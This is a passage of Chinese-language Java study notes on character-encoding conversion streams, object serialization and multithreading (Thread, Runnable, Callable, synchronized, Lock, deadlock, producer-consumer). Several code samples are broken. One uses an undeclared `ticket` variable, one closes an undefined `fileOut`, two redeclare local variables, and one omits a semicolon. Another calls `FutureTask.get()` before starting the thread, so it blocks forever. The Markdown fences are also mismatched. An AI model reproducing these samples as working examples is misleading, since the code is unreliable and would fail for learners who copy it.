        InputStreamReader isr2 = new InputStreamReader(new FileInputStream(FileName) , "GBK");
		// 定义变量,保存字符
        int read;
      	// 使用默认编码字符流读取,乱码
        while ((read = isr.read()) != -1) {
            System.out.print((char)read); // ��Һ�
        }
        isr.close();
      
      	// 使用指定编码字符流读取,正常解析
        while ((read = isr2.read()) != -1) {
            System.out.print((char)read);// 大家好
        }
        isr2.close();
    }
}
```

##### 10.8.5 OutputStreamWriter类

转换流`java.io.OutputStreamWriter` ，是Writer的子类，是从字符流到字节流的桥梁。使用指定的字符集将字符编码为字节。它的字符集可以由名称指定，也可以接受平台的默认字符集。 

==**构造方法**==

- `OutputStreamWriter(OutputStream in)`: 创建一个使用默认字符集的字符流。 
- `OutputStreamWriter(OutputStream in, String charsetName)`: 创建一个指定字符集的字符流。

构造举例，代码如下： 

```java
OutputStreamWriter isr = new OutputStreamWriter(new FileOutputStream("out.txt"));
OutputStreamWriter isr2 = new OutputStreamWriter(new FileOutputStream("out.txt") , "GBK");
```

==**指定编码写出**==

```java
public class OutputDemo {
    public static void main(String[] args) throws IOException {
      	// 定义文件路径
        String FileName = "E:\\out.txt";
      	// 创建流对象,默认UTF8编码
        OutputStreamWriter osw = new OutputStreamWriter(new FileOutputStream(FileName));
        // 写出数据
      	osw.write("你好"); // 保存为6个字节
        osw.close();
      	
		// 定义文件路径
		String FileName2 = "E:\\out2.txt";
     	// 创建流对象,指定GBK编码
        OutputStreamWriter osw2 = new OutputStreamWriter(new FileOutputStream(FileName2),"GBK");
        // 写出数据
      	osw2.write("你好");// 保存为4个字节
        osw2.close();
    }
}
```

==**转换流理解图解**==

**转换流是字节与字符间的桥梁！**



#### 10.9 序列化

##### 10.9.1 概述

Java 提供了一种对象**序列化**的机制。用一个字节序列可以表示一个对象，该字节序列包含该`对象的数据`、`对象的类型`和`对象中存储的属性`等信息。字节序列写出到文件之后，相当于文件中**持久保存**了一个对象的信息。 

反之，该字节序列还可以从文件中读取回来，重构对象，对它进行**反序列化**。`对象的数据`、`对象的类型`和`对象中存储的数据`信息，都可以用来在内存中创建对象。看图理解序列化： 

![image-20240205125433314](./img/小米虫爬山路-img/image-20240205125433314.png)

##### 10.9.2 ObjectOutputStream类

`java.io.ObjectOutputStream ` 类，将Java对象的原始数据类型写出到文件,实现对象的持久存储。

==**构造方法**==

* `public ObjectOutputStream(OutputStream out) `： 创建一个指定OutputStream的ObjectOutputStream。

构造举例，代码如下：  

```java
FileOutputStream fileOut = new FileOutputStream("employee.txt");
ObjectOutputStream out = new ObjectOutputStream(fileOut);
```

==**序列化操作**==

1. 一个对象要想序列化，必须满足两个条件:

* 该类必须实现`java.io.Serializable ` 接口，`Serializable` 是一个标记接口，不实现此接口的类将不会使任何状态序列化或反序列化，会抛出`NotSerializableException` 。
* 该类的所有属性必须是可序列化的。如果有一个属性不需要可序列化的，则该属性必须注明是瞬态的，使用`transient` 关键字修饰。

```java
public class Employee implements java.io.Serializable {
    public String name;
    public String address;
    public transient int age; // transient瞬态修饰成员,不会被序列化
    public void addressCheck() {
      	System.out.println("Address  check : " + name + " -- " + address);
    }
}
```

2.写出对象方法

* `public final void writeObject (Object obj)` : 将指定的对象写出。

```java
public class SerializeDemo{
   	public static void main(String [] args)   {
    	Employee e = new Employee();
    	e.name = "zhangsan";
    	e.address = "beiqinglu";
    	e.age = 20; 
    	try {
      		// 创建序列化流对象
          ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("employee.txt"));
        	// 写出对象
        	out.writeObject(e);
        	// 释放资源
        	out.close();
        	fileOut.close();
        	System.out.println("Serialized data is saved"); // 姓名，地址被序列化，年龄没有被序列化。
        } catch(IOException i)   {
            i.printStackTrace();
        }
   	}
}
输出结果：
Serialized data is saved
```

##### 10.9.3 ObjectInputStream类

ObjectInputStream反序列化流，将之前使用ObjectOutputStream序列化的原始数据恢复为对象。 

==**构造方法**==

* `public ObjectInputStream(InputStream in) `： 创建一个指定InputStream的ObjectInputStream。

==**反序列化操作1**==

如果能找到一个对象的class文件，我们可以进行反序列化操作，调用`ObjectInputStream`读取对象的方法：

- `public final Object readObject ()` : 读取一个对象。

```java
public class DeserializeDemo {
   public static void main(String [] args)   {
        Employee e = null;
        try {		
             // 创建反序列化流
             FileInputStream fileIn = new FileInputStream("employee.txt");
             ObjectInputStream in = new ObjectInputStream(fileIn);
             // 读取一个对象
             e = (Employee) in.readObject();
             // 释放资源
             in.close();
             fileIn.close();
        }catch(IOException i) {
             // 捕获其他异常
             i.printStackTrace();
             return;
        }catch(ClassNotFoundException c)  {
        	// 捕获类找不到异常
             System.out.println("Employee class not found");
             c.printStackTrace();
             return;
        }
        // 无异常,直接打印输出
        System.out.println("Name: " + e.name);	// zhangsan
        System.out.println("Address: " + e.address); // beiqinglu
        System.out.println("age: " + e.age); // 0
    }
}
```

**对于JVM可以反序列化对象，它必须是能够找到class文件的类。如果找不到该类的class文件，则抛出一个 `ClassNotFoundException` 异常。**  

==反序列化操作2==

**另外，当JVM反序列化对象时，能找到class文件，但是class文件在序列化对象之后发生了修改，那么反序列化操作也会失败，抛出一个`InvalidClassException`异常。**发生这个异常的原因如下：

* 该类的序列版本号与从流中读取的类描述符的版本号不匹配 
* 该类包含未知数据类型 
* 该类没有可访问的无参数构造方法 

`Serializable` 接口给需要序列化的类，提供了一个序列版本号。`serialVersionUID` 该版本号的目的在于验证序列化的对象和对应类是否版本匹配。

```java
public class Employee implements java.io.Serializable {
     // 加入序列版本号
     private static final long serialVersionUID = 1L;
     public String name;
     public String address;
     // 添加新的属性 ,重新编译, 可以反序列化,该属性赋为默认值.
     public int eid; 

     public void addressCheck() {
         System.out.println("Address  check : " + name + " -- " + address);
     }
}
```

### 11、多线程

#### 11.1 进程和线程

- 进程：是正在运行的程序

  独立性：进程是一个能独立运行的基本单位，同时也是系统分配资源和调度的独立单位
  动态性：进程的实质是程序的一次执行过程，进程是动态产生，动态消亡的
  并发性：任何进程都可以同其他进程一起并发执行

- 线程：==**是进程中的单个顺序控制流，是一条执行路径**==

  ​	单线程：一个进程如果只有一条执行路径，则称为单线程程序

  ​	多线程：一个进程如果有多条执行路径，则称为多线程程序

![image-20240205161555413](./img/小米虫爬山路-img/image-20240205161555413.png)

#### 11.2 并发和并行

+ 并行：在同一时刻，有多个指令在多个CPU上同时执行。

  ![image-20240205162225023](./img/小米虫爬山路-img/image-20240205162225023.png)

+ 并发：在同一时刻，有多个指令在单个CPU上交替执行。

  ![03_并发](./img/小米虫爬山路-img/03_并发.png)

#### 11.3 实现多线程

##### 11.3.1 继承Thread类

- 方法介绍

  | 方法名       | 说明                                        |
  | ------------ | ------------------------------------------- |
  | void run()   | 在线程开启后，此方法将被调用执行            |
  | void start() | 使此线程开始执行，Java虚拟机会调用run方法() |

- 实现步骤

  - 定义一个类MyThread继承Thread类
  - 在MyThread类中重写run()方法
  - 创建MyThread类的对象
  - 启动线程

- 代码演示

  ```java
  public class MyThread extends Thread {
      @Override
      public void run() {
          for(int i=0; i<100; i++) {
              System.out.println(i);
          }
      }
  }
  public class MyThreadDemo {
      public static void main(String[] args) {
          MyThread my1 = new MyThread();
          MyThread my2 = new MyThread();
  
  //        my1.run();
  //        my2.run();
  
          //void start() 导致此线程开始执行; Java虚拟机调用此线程的run方法
          my1.start();
          my2.start();
      }
  }
  ```

- 两个小问题

  - 为什么要重写run()方法？

    因为run()是用来封装被线程执行的代码

  - run()方法和start()方法的区别？

    run()：封装线程执行的代码，直接调用，相当于普通方法的调用

    start()：启动线程；然后由JVM调用此线程的run()方法

##### 11.3.2 实现Runnable接口

- Thread构造方法

  | 方法名                               | 说明                   |
  | ------------------------------------ | ---------------------- |
  | Thread(Runnable target)              | 分配一个新的Thread对象 |
  | Thread(Runnable target, String name) | 分配一个新的Thread对象 |

- 实现步骤

  - 定义一个类MyRunnable实现Runnable接口
  - 在MyRunnable类中重写run()方法
  - 创建MyRunnable类的对象
  - 创建Thread类的对象，把MyRunnable对象作为构造方法的参数
  - 启动线程

- 代码演示

  ```java
  public class MyRunnable implements Runnable {
      @Override
      public void run() {
          for(int i=0; i<100; i++) {
              System.out.println(Thread.currentThread().getName()+":"+i);
          }
      }
  }
  public class MyRunnableDemo {
      public static void main(String[] args) {
          //创建MyRunnable类的对象
          MyRunnable my = new MyRunnable();
  
          //创建Thread类的对象，把MyRunnable对象作为构造方法的参数
          //Thread(Runnable target)
  //        Thread t1 = new Thread(my);
  //        Thread t2 = new Thread(my);
          //Thread(Runnable target, String name)
          Thread t1 = new Thread(my,"坦克");
          Thread t2 = new Thread(my,"飞机");
  
          //启动线程
          t1.start();
          t2.start();
      }
  }
  ```

##### 11.3.3 实现Callable接口

+ 方法介绍

  | 方法名                           | 说明                                               |
  | -------------------------------- | -------------------------------------------------- |
  | V call()                         | 计算结果，如果无法计算结果，则抛出一个异常         |
  | FutureTask(Callable<V> callable) | 创建一个 FutureTask，一旦运行就执行给定的 Callable |
  | V get()                          | 如有必要，等待计算完成，然后获取其结果             |

+ 实现步骤

  + 定义一个类MyCallable实现Callable接口
  + 在MyCallable类中重写call()方法
  + 创建MyCallable类的对象
  + 创建Future的实现类FutureTask对象，把MyCallable对象作为构造方法的参数
  + 创建Thread类的对象，把FutureTask对象作为构造方法的参数
  + 启动线程
  + 再调用get方法，就可以获取线程结束之后的结果。

+ 代码演示

  ```java
  public class MyCallable implements Callable<String> {
      @Override
      public String call() throws Exception {
          for (int i = 0; i < 100; i++) {
              System.out.println("跟女孩表白" + i);
          }
          //返回值就表示线程运行完毕之后的结果
          return "答应";
      }
  }
  public class Demo {
      public static void main(String[] args) throws ExecutionException, InterruptedException {
          //线程开启之后需要执行里面的call方法
          MyCallable mc = new MyCallable();
  
          //Thread t1 = new Thread(mc);
  
          //可以获取线程执行完毕之后的结果.也可以作为参数传递给Thread对象
          FutureTask<String> ft = new FutureTask<>(mc);
  
          //创建线程对象
          Thread t1 = new Thread(ft);
  
          String s = ft.get();
          //开启线程
          t1.start();
  
          //String s = ft.get();
          System.out.println(s);
      }
  }
  ```

+ 三种实现方式的对比

  + 实现Runnable、Callable接口
    + 好处: 扩展性强，实现该接口的同时还可以继承其他的类
    + 缺点: 编程相对复杂，不能直接使用Thread类中的方法
  + 继承Thread类
    + 好处: 编程比较简单，可以直接使用Thread类中的方法
    + 缺点: 可以扩展性较差，不能再继承其他的类

#### 11.4 相关的成员方法

![image-20240206135834801](./img/小米虫爬山路-img/image-20240206135834801.png)

##### 11.4.1 设置和获取线程名称

- 方法介绍

  | 方法名                     | 说明                               |
  | -------------------------- | ---------------------------------- |
  | void  setName(String name) | 将此线程的名称更改为等于参数name   |
  | String  getName()          | 返回此线程的名称                   |
  | Thread  currentThread()    | 返回对当前正在执行的线程对象的引用 |

- 代码演示

  ```java
  public class MyThread extends Thread {
      public MyThread() {}
      public MyThread(String name) {
          super(name);
      }
  
      @Override
      public void run() {
          for (int i = 0; i < 100; i++) {
              System.out.println(getName()+":"+i);
          }
      }
  }
  public class MyThreadDemo {
      public static void main(String[] args) {
          MyThread my1 = new MyThread();
          MyThread my2 = new MyThread();
  
          //void setName(String name)：将此线程的名称更改为等于参数 name
          my1.setName("高铁");
          my2.setName("飞机");
  
          //Thread(String name)
          MyThread my1 = new MyThread("高铁");
          MyThread my2 = new MyThread("飞机");
  
          my1.start();
          my2.start();
  
          //static Thread currentThread() 返回对当前正在执行的线程对象的引用
          System.out.println(Thread.currentThread().getName());
      }
  }
  ```

##### 11.4.2 线程休眠

+ 相关方法

  | 方法名                         | 说明                                             |
  | ------------------------------ | ------------------------------------------------ |
  | static void sleep(long millis) | 使当前正在执行的线程停留（暂停执行）指定的毫秒数 |

+ 代码演示

  ```java
  public class MyRunnable implements Runnable {
      @Override
      public void run() {
          for (int i = 0; i < 100; i++) {
              try {
                  Thread.sleep(100);
              } catch (InterruptedException e) {
                  e.printStackTrace();
              }
  
              System.out.println(Thread.currentThread().getName() + "---" + i);
          }
      }
  }
  public class Demo {
      public static void main(String[] args) throws InterruptedException {
          /*System.out.println("睡觉前");
          Thread.sleep(3000);
          System.out.println("睡醒了");*/
  
          MyRunnable mr = new MyRunnable();
  
          Thread t1 = new Thread(mr);
          Thread t2 = new Thread(mr);
  
          t1.start();
          t2.start();
      }
  }
  ```

##### 11.4.3 线程优先级

- 线程调度

  - 两种调度方式

    - 分时调度模型：所有线程轮流使用 CPU 的使用权，平均分配每个线程占用 CPU 的时间片
    - 抢占式调度模型：优先让优先级高的线程使用 CPU，如果线程的优先级相同，那么会随机选择一个，优先级高的线程获取的 CPU 时间片相对多一些

  - Java使用的是抢占式调度模型

  - 随机性

    假如计算机只有一个 CPU，那么 CPU 在某一个时刻只能执行一条指令，线程只有得到CPU时间片，也就是使用权，才可以执行指令。所以说多线程程序的执行是有随机性，因为谁抢到CPU的使用权是不一定的

    ![05_多线程示例图](./img/小米虫爬山路-img/05_多线程示例图.png)

- 优先级相关方法

  | 方法名                                  | 说明                                                         |
  | --------------------------------------- | ------------------------------------------------------------ |
  | final int getPriority()                 | 返回此线程的优先级                                           |
  | final void setPriority(int newPriority) | 更改此线程的优先级线程默认优先级是5；线程优先级的范围是：1-10 （越大优先级越高） |

- 代码演示

  ```java
  public class MyCallable implements Callable<String> {
      @Override
      public String call() throws Exception {
          for (int i = 0; i < 100; i++) {
              System.out.println(Thread.currentThread().getName() + "---" + i);
          }
          return "线程执行完毕了";
      }
  }
  public class Demo {
      public static void main(String[] args) {
          //优先级: 1 - 10 默认值:5
          MyCallable mc = new MyCallable();
  
          FutureTask<String> ft = new FutureTask<>(mc);
  
          Thread t1 = new Thread(ft);
          t1.setName("飞机");
          t1.setPriority(10);
          //System.out.println(t1.getPriority());//5
          t1.start();
  
          MyCallable mc2 = new MyCallable();
  
          FutureTask<String> ft2 = new FutureTask<>(mc2);
  
          Thread t2 = new Thread(ft2);
          t2.setName("坦克");
          t2.setPriority(1);
          //System.out.println(t2.getPriority());//5
          t2.start();
      }
  }
  ```

##### 11.4.4 守护线程(备胎线程)

- 相关方法

  | 方法名                     | 说明                                                         |
  | -------------------------- | ------------------------------------------------------------ |
  | void setDaemon(boolean on) | 将此线程标记为守护线程，当运行的线程都是守护线程时，Java虚拟机将退出，当其他的==**非守护线程执行完毕之后**==，守护线程会陆续结束 |



- 代码演示

  ```java
  public class MyThread1 extends Thread {
      @Override
      public void run() {
          for (int i = 0; i < 10; i++) {
              System.out.println(getName() + "---" + i);
          }
      }
  }
  public class MyThread2 extends Thread {
      @Override
      public void run() {
          for (int i = 0; i < 100; i++) {
              System.out.println(getName() + "---" + i);
          }
      }
  }
  public class Demo {
      public static void main(String[] args) {
          MyThread1 t1 = new MyThread1();
          MyThread2 t2 = new MyThread2();
  
          t1.setName("女神");
          t2.setName("备胎");
  
          //把第二个线程设置为守护线程
          //当普通线程执行完之后,那么守护线程也没有继续运行下去的必要了.
          t2.setDaemon(true);
  
          t1.start();
          t2.start();
      }
  }
  ```

##### 11.4.5 出让/礼让线程

相关方法

| 方法名              | 说明                                |
| ------------------- | ----------------------------------- |
| static void yield() | 让线程结果更均匀点，让出CPU的使用权 |

```java
public class MyThread extends Thread {
    public MyThread() {}
    public MyThread(String name) {
        super(name);
    }

    @Override
    public void run() {
        for (int i = 0; i < 100; i++) {
            System.out.println(getName()+":"+i);
            //出让线程
            Thread.yield()
        }
    }
}
public class MyThreadDemo {
    public static void main(String[] args) {
        MyThread my1 = new MyThread();
        MyThread my2 = new MyThread();

        my1.setName("高铁");
        my2.setName("飞机");

        //Thread(String name)
        MyThread my1 = new MyThread("高铁");
        MyThread my2 = new MyThread("飞机");

        my1.start();
        my2.start();
    }
```

##### 11.4.6 插入/插队线程

相关方法

| 方法名            | 说明                                 |
| ----------------- | ------------------------------------ |
| final void join() | 让当前线程的执行在开启线程的线程之前 |

```java
public class MyThread extends Thread{
    @Override
    public void run() {
        for (int i = 0; i < 10; i++) {
            System.out.println(Thread.currentThread().getName()+"Hello World!");
        }
    }
}
public class Main {
    public static void main(String[] args) throws InterruptedException {
        MyThread m = new MyThread();
        m.setName("t1");
        m.start();
        m.join();

        for (int i = 0; i < 100; i++) {
            System.out.println("main"+i);
        }
    }
}
```

#### 11.5 线程的生命周期

![image-20240206155716442](./img/小米虫爬山路-img/image-20240206155716442.png)

#### 11.6 线程同步

##### 11.6.1 卖票

- 案例需求

  某电影院目前正在上映国产大片，共有100张票，而它有3个窗口卖票，请设计一个程序模拟该电影院卖票

- 实现步骤

  - 定义一个类SellTicket实现Runnable接口，里面定义一个成员变量：private int tickets = 100;

  - 在SellTicket类中重写run()方法实现卖票，代码步骤如下

  - 判断票数大于0，就卖票，并告知是哪个窗口卖的
  - 卖了票之后，总票数要减1
  - 票卖没了，线程停止
  - 定义一个测试类SellTicketDemo，里面有main方法，代码步骤如下
  - 创建SellTicket类的对象
  - 创建三个Thread类的对象，把SellTicket对象作为构造方法的参数，并给出对应的窗口名称
  - 启动线程

- 代码实现

```java
public class SellTicket implements Runnable {
    private int tickets = 100;
    //在SellTicket类中重写run()方法实现卖票，代码步骤如下
    @Override
    public void run() {
        while (true) {
            if(ticket <= 0){
                    //卖完了
                    break;
                }else{
                    try {
                        Thread.sleep(100);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                    ticket--;
                    System.out.println(Thread.currentThread().getName() + "在卖票,还剩下" + ticket + "张票");
                }
        }
    }
}
public class SellTicketDemo {
    public static void main(String[] args) {
        //创建SellTicket类的对象
        SellTicket st = new SellTicket();

        //创建三个Thread类的对象，把SellTicket对象作为构造方法的参数，并给出对应的窗口名称
        Thread t1 = new Thread(st,"窗口1");
        Thread t2 = new Thread(st,"窗口2");
        Thread t3 = new Thread(st,"窗口3");

        //启动线程
        t1.start();
        t2.start();
        t3.start();
    }
}
```

##### 11.6.2 卖票案例的问题

- 卖票出现了问题

  - 相同的票出现了多次

  - 出现了负数的票

- 问题产生原因

  线程执行的随机性导致的,可能在卖票过程中丢失cpu的执行权,导致出现问题

##### 11.6.3 同步代码块解决数据安全问题

- 安全问题出现的条件

  - 是多线程环境

  - 有共享数据

  - 有多条语句操作共享数据

- 如何解决多线程安全问题呢?

  - 基本思想：让程序没有安全问题的环境

- 怎么实现呢?

  - 把多条语句操作共享数据的代码给锁起来，让任意时刻只能有一个线程执行即可

  - Java提供了同步代码块的方式来解决

- 同步代码块格式：

```java
synchronized(任意对象) { 
	多条语句操作共享数据的代码 
}
```

- synchronized(任意对象)：就相当于给代码加锁了，任意对象就可以看成是一把锁
- 同步的好处和弊端  

  - 好处：解决了多线程的数据安全问题
  - 弊端：当线程很多时，因为每个线程都会去判断同步上的锁，这是很耗费资源的，无形中会降低程序的运行效率
- 代码演示

```java
public class SellTicket implements Runnable {
    private int tickets = 100;
    private Object obj = new Object();

    @Override
    public void run() {
        while (true) {
            synchronized (obj) { // 对可能有安全问题的代码加锁,多个线程必须使用同一把锁
                //t1进来后，就会把这段代码给锁起来
                if (tickets > 0) {
                    try {
                        Thread.sleep(100);
                        //t1休息100毫秒
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                    //窗口1正在出售第100张票
                    System.out.println(Thread.currentThread().getName() + "正在出售第" + tickets + "张票");
                    tickets--; //tickets = 99;
                }
            }
            //t1出来了，这段代码的锁就被释放了
        }
    }
}

public class SellTicketDemo {
    public static void main(String[] args) {
        SellTicket st = new SellTicket();

        Thread t1 = new Thread(st, "窗口1");
        Thread t2 = new Thread(st, "窗口2");
        Thread t3 = new Thread(st, "窗口3");

        t1.start();
        t2.start();
        t3.start();
    }
}
```

##### 11.6.4 同步方法解决数据安全问题

- 同步方法的格式

  同步方法：就是把synchronized关键字加到方法上

  ```java
  修饰符 synchronized 返回值类型 方法名(方法参数) { 
  	方法体；
  }
  ```

  同步方法的锁对象是什么呢?

  ​	this

- 静态同步方法

  同步静态方法：就是把synchronized关键字加到静态方法上

  ```java
  修饰符 static synchronized 返回值类型 方法名(方法参数) { 
  	方法体；
  }
  ```

  同步静态方法的锁对象是什么呢?

  ​	类名.class

- 代码演示

  ```java
  public class MyRunnable implements Runnable {
      private static int ticketCount = 100;
  
      @Override
      public void run() {
          while(true){
              if("窗口一".equals(Thread.currentThread().getName())){
                  //同步方法
                  boolean result = synchronizedMthod();
                  if(result){
                      break;
                  }
              }
  
              if("窗口二".equals(Thread.currentThread().getName())){
                  //同步代码块
                  synchronized (MyRunnable.class){
                      if(ticketCount == 0){
                         break;
                      }else{
                          try {
                              Thread.sleep(10);
                          } catch (InterruptedException e) {
                              e.printStackTrace();
                          }
                          ticketCount--;
                          System.out.println(Thread.currentThread().getName() + "在卖票,还剩下" + ticketCount + "张票");
                      }
                  }
              }
  
          }
      }
  
      private static synchronized boolean synchronizedMthod() {
          if(ticketCount == 0){
              return true;
          }else{
              try {
                  Thread.sleep(10);
              } catch (InterruptedException e) {
                  e.printStackTrace();
              }
              ticketCount--;
              System.out.println(Thread.currentThread().getName() + "在卖票,还剩下" + ticketCount + "张票");
              return false;
          }
      }
  }
  ```




```java
 public class Demo {
      public static void main(String[] args) {
          MyRunnable mr = new MyRunnable();      
	Thread t1 = new Thread(mr);
         Thread t2 = new Thread(mr);

      t1.setName("窗口一");
      t2.setName("窗口二");

      t1.start();
      t2.start();
  }
```

  }

  ```java

### 2.5Lock锁【应用】

虽然我们可以理解同步代码块和同步方法的锁对象问题，但是我们并没有直接看到在哪里加上了锁，在哪里释放了锁，为了更清晰的表达如何加锁和释放锁，JDK5以后提供了一个新的锁对象Lock

Lock是接口不能直接实例化，这里采用它的实现类ReentrantLock来实例化

- ReentrantLock构造方法

  | 方法名             | 说明                   |
  | --------------- | -------------------- |
  | ReentrantLock() | 创建一个ReentrantLock的实例 |

- 加锁解锁方法

  | 方法名           | 说明   |
  | ------------- | ---- |
  | void lock()   | 获得锁  |
  | void unlock() | 释放锁  |

- 代码演示

  ```java
  public class Ticket implements Runnable {
      //票的数量
      private int ticket = 100;
      private Object obj = new Object();
      private Lock lock = new ReentrantLock();

      @Override
      public void run() {
          while (true) {
              //synchronized (obj){//多个线程必须使用同一把锁.
              try {
                  lock.lock();
                  if (ticket <= 0) {
                      //卖完了
                      break;
                  } else {
                      Thread.sleep(100);
                      ticket--;
                      System.out.println(Thread.currentThread().getName() + "在卖票,还剩下" + ticket + "张票");
                  }
              } catch (InterruptedException e) {
                  e.printStackTrace();
              } finally {
                  lock.unlock();
              }
              // }
          }
      }
  }

  public class Demo {
      public static void main(String[] args) {
          Ticket ticket = new Ticket();

          Thread t1 = new Thread(ticket);
          Thread t2 = new Thread(ticket);
          Thread t3 = new Thread(ticket);

          t1.setName("窗口一");
          t2.setName("窗口二");
          t3.setName("窗口三");

          t1.start();
          t2.start();
          t3.start();
      }
  }
  ```

==**注意：无论是Lock还是同步代码块都不会阻止线程抢夺cpu的占用权，而是会阻止线程执行到已经被上锁的代码块中**==

##### 11.6.5 死锁

+ 概述

  线程死锁是指由于两个或者多个线程互相持有对方所需要的资源，导致这些线程处于等待状态，无法前往执行

+ 什么情况下会产生死锁

  1. 资源有限
  2. 同步嵌套

+ 代码演示

```java
public class Demo {
    public static void main(String[] args) {
        Object objA = new Object();
        Object objB = new Object();

        new Thread(()->{
            while(true){
                synchronized (objA){
                    //线程一
                    synchronized (objB){
                        System.out.println("小康同学正在走路");
                    }
                }
            }
        }).start();

        new Thread(()->{
            while(true){
                synchronized (objB){
                    //线程二
                    synchronized (objA){
                        System.out.println("小薇同学正在走路");
                    }
                }
            }
        }).start();
    }
}
```

注意：==**死锁是使用锁出现错误的情况**==

#### 11.7 生产者消费者

##### 11.7.1 生产者和消费者模式概述

- 概述

  生产者消费者模式是一个十分经典的多线程协作的模式，弄懂生产者消费者问题能够让我们对多线程编程的理解更加深刻。

  所谓生产者消费者问题，实际上主要是包含了两类线程：

  ​	一类是生产者线程用于生产数据

  ​	一类是消费者线程用于消费数据

  为了解耦生产者和消费者的关系，通常会采用共享的数据区域，就像是一个仓库

  生产者生产数据之后直接放置在共享数据区中，并不需要关心消费者的行为

  消费者只需要从共享数据区中去获取数据，并不需要关心生产者的行为

- Object类的等待和唤醒方法

  | 方法名           | 说明                                                         |
  | ---------------- | ------------------------------------------------------------ |
  | void wait()      | 导致当前线程等待，直到另一个线程调用该对象的 notify()方法或 notifyAll()方法 |
  | void notify()    | 唤醒正在等待对象监视器的单个线程                             |
  | void notifyAll() | 唤醒正在等待对象监视器的所有线程                             |

##### 11.7.2 生产者和消费者案例

- 案例需求

  + 桌子类(Desk)：定义表示包子数量的变量,定义锁对象变量,定义标记桌子上有无包子的变量

  + 生产者类(Cooker)：实现Runnable接口，重写run()方法，设置线程任务

    1.判断是否有包子,决定当前线程是否执行

    2.如果有包子,就进入等待状态,如果没有包子,继续执行,生产包子

    3.生产包子之后,更新桌子上包子状态,唤醒消费者消费包子

  + 消费者类(Foodie)：实现Runnable接口，重写run()方法，设置线程任务

    1.判断是否有包子,决定当前线程是否执行

    2.如果没有包子,就进入等待状态,如果有包子,就消费包子

    3.消费包子后,更新桌子上包子状态,唤醒生产者生产包子

  + 测试类(Demo)：里面有main方法，main方法中的代码步骤如下

    创建生产者线程和消费者线程对象

    分别开启两个线程

- 代码实现

```java
public class Desk {

    //定义一个标记
    //true 就表示桌子上有汉堡包的,此时允许吃货执行
    //false 就表示桌子上没有汉堡包的,此时允许厨师执行
    public static boolean flag = false;

    //汉堡包的总数量
    public static int count = 10;

    //锁对象
    public static final Object lock = new Object();
}

public class Cooker extends Thread {
//    生产者步骤：
//            1，判断桌子上是否有汉堡包
//    如果有就等待，如果没有才生产。
//            2，把汉堡包放在桌子上。
//            3，叫醒等待的消费者开吃。
    @Override
    public void run() {
        while(true){
            synchronized (Desk.lock){
                if(Desk.count == 0){
                    break;
                }else{
                    if(!Desk.flag){
                        //生产
                        System.out.println("厨师正在生产汉堡包");
                        Desk.flag = true;
                        Desk.lock.notifyAll();
                    }else{
                        try {
                            Desk.lock.wait();
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                    }
                }
            }
        }
    }
}

public class Foodie extends Thread {
    @Override
    public void run() {
//        1，判断桌子上是否有汉堡包。
//        2，如果没有就等待。
//        3，如果有就开吃
//        4，吃完之后，桌子上的汉堡包就没有了
//                叫醒等待的生产者继续生产
//        汉堡包的总数量减一

        //套路:
            //1. while(true)死循环
            //2. synchronized 锁,锁对象要唯一
            //3. 判断,共享数据是否结束. 结束
            //4. 判断,共享数据是否结束. 没有结束
        while(true){
            synchronized (Desk.lock){
                if(Desk.count == 0){
                    break;
                }else{
                    if(Desk.flag){
                        //有
                        System.out.println("吃货在吃汉堡包");
                        Desk.flag = false;
                        Desk.lock.notifyAll();
                        Desk.count--;
                    }else{
                        //没有就等待
                        //使用什么对象当做锁,那么就必须用这个对象去调用等待和唤醒的方法.
                        try {
                            Desk.lock.wait();
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                    }
                }
            }
        }

    }
}

public class Demo {
    public static void main(String[] args) {
        /*消费者步骤：
        1，判断桌子上是否有汉堡包。
        2，如果没有就等待。
        3，如果有就开吃
        4，吃完之后，桌子上的汉堡包就没有了
                叫醒等待的生产者继续生产
        汉堡包的总数量减一*/

        /*生产者步骤：
        1，判断桌子上是否有汉堡包
        如果有就等待，如果没有才生产。
        2，把汉堡包放在桌子上。
        3，叫醒等待的消费者开吃。*/

        Foodie f = new Foodie();
        Cooker c = new Cooker();

        f.start();
        c.start();

    }
}
```

##### 11.7.3 生产者和消费者案例优化

+ 需求

  + 将Desk类中的变量,采用面向对象的方式封装起来
  + 生产者和消费者类中构造方法接收Desk类对象,之后在run方法中进行使用
  + 创建生产者和消费者线程对象,构造方法中传入Desk类对象
  + 开启两个线程

+ 代码实现

```java
public class Desk {

    //定义一个标记
    //true 就表示桌子上有汉堡包的,此时允许吃货执行
    //false 就表示桌子上没有汉堡包的,此时允许厨师执行
    //public static boolean flag = false;
    private boolean flag;

    //汉堡包的总数量
    //public static int count = 10;
    //以后我们在使用这种必须有默认值的变量
   // private int count = 10;
    private int count;

    //锁对象
    //public static final Object lock = new Object();
    private final Object lock = new Object();

    public Desk() {
        this(false,10); // 在空参内部调用带参,对成员变量进行赋值,之后就可以直接使用成员变量了
    }

    public Desk(boolean flag, int count) {
        this.flag = flag;
        this.count = count;
    }

    public boolean isFlag() {
        return flag;
    }

    public void setFlag(boolean flag) {
        this.flag = flag;
    }

    public int getCount() {
        return count;
    }

    public void setCount(int count) {
        this.count = count;
    }

    public Object getLock() {
        return lock;
    }

    @Override
    public String toString() {
        return "Desk{" +
                "flag=" + flag +
                ", count=" + count +
                ", lock=" + lock +
                '}';
    }
}

public class Cooker extends Thread {

    private Desk desk;

    public Cooker(Desk desk) {
        this.desk = desk;
    }
//    生产者步骤：
//            1，判断桌子上是否有汉堡包
//    如果有就等待，如果没有才生产。
//            2，把汉堡包放在桌子上。
//            3，叫醒等待的消费者开吃。

    @Override
    public void run() {
        while(true){
            synchronized (desk.getLock()){
                if(desk.getCount() == 0){
                    break;
                }else{
                    //System.out.println("验证一下是否执行了");
                    if(!desk.isFlag()){
                        //生产
                        System.out.println("厨师正在生产汉堡包");
                        desk.setFlag(true);
                        desk.getLock().notifyAll();
                    }else{
                        try {
                            desk.getLock().wait();
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                    }
                }
            }
        }
    }
}

public class Foodie extends Thread {
    private Desk desk;

    public Foodie(Desk desk) {
        this.desk = desk;
    }

    @Override
    public void run() {
//        1，判断桌子上是否有汉堡包。
//        2，如果没有就等待。
//        3，如果有就开吃
//        4，吃完之后，桌子上的汉堡包就没有了
//                叫醒等待的生产者继续生产
//        汉堡包的总数量减一

        //套路:
            //1. while(true)死循环
